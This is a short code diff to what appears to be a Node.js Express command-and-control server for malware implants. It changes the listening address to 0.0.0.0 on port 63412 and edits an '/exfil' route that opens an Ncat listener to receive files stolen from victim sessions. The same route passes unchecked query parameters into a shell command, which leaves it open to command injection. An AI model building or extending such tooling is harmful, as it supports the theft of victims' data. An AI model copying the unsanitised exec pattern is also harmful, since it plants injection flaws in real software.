@@ -1,7 +1,7 @@
 const express = require('express')
 const fs = require('fs')
-const hostname = 'localhost';
-const port = 443;
+const hostname = '0.0.0.0';
+const port = 63412;
 var session = require('express-session');
 const { exec } = require("child_process");
 
@@ -80,8 +80,7 @@ app.get('/updateImplant', (req, res) => {
 });
 
 app.get('/exfil', (req, res) => {
-	async function OpenExfilPort () {
-		var sid = req.query.sid;
+	async function OpenExfilPort (sid) {
 		var fileName = req.query.file;
 		await exec(`Ncat -lp 1234 > Sessions/${sid}/${fileName}`, (err, stdout, stderr) => {
     		if (err) console.error(err)
@@ -89,7 +88,8 @@ app.get('/exfil', (req, res) => {
     		console.log(`${sid} has transferred file: ${fileName}.`);
 		});
 	}
-	OpenExfilPort()
+	var sid = req.query.sid;
+	OpenExfilPort(sid)
 	res.send()
 	ReturnToWait(sid)
 });
